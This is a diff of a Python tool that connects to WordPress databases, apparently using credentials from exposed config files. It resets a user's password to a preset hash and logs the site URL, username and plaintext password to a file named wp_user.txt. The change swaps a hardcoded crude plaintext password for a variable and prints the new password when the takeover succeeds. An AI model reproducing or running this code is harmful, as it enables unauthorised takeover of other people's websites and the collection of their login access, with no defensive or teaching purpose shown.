@@ -11,7 +11,8 @@ class Connect:
         self.password = password
         self.database = database
         self.table_prefix = table_prefix
-        self.user_password = "$P$BWcaOJsJx95iT1L38BPE32StxoWkji/"  # peler12@
+        self.pw = '' # pw asli biar enak di saveny
+        self.user_password = "$P$BWcaOJsJx95iT1L38BPE32StxoWkji/" # pw hash
         self.connection: mysql.connector.MySQLConnection = None
 
     @staticmethod
@@ -92,13 +93,13 @@ class Connect:
             )
             self.commit()
             self.write_file(
-                'wp_user.txt', f"Config Url: {config_url}\nUrl: {url}\nUsername: {user_data['user_login']}\nPassword: peler12@\n")
+                'wp_user.txt', f"Config Url: {config_url}\nUrl: {url}\nUsername: {user_data['user_login']}\nPassword: {self.pw}\n")
             if resp.rowcount > 0:
                 self.coloring_print(
-                    f"User {user_data['user_login']} password changed", True)
+                    f"User {user_data['user_login']} password changed to {self.pw}", True)
             else:
                 self.coloring_print(
-                    f"User {user_data['user_login']} password not changed or already changed", True)
+                    f"User {user_data['user_login']} password not changed or already changed to {self.pw}", True)
         self.disconnect()
 
 
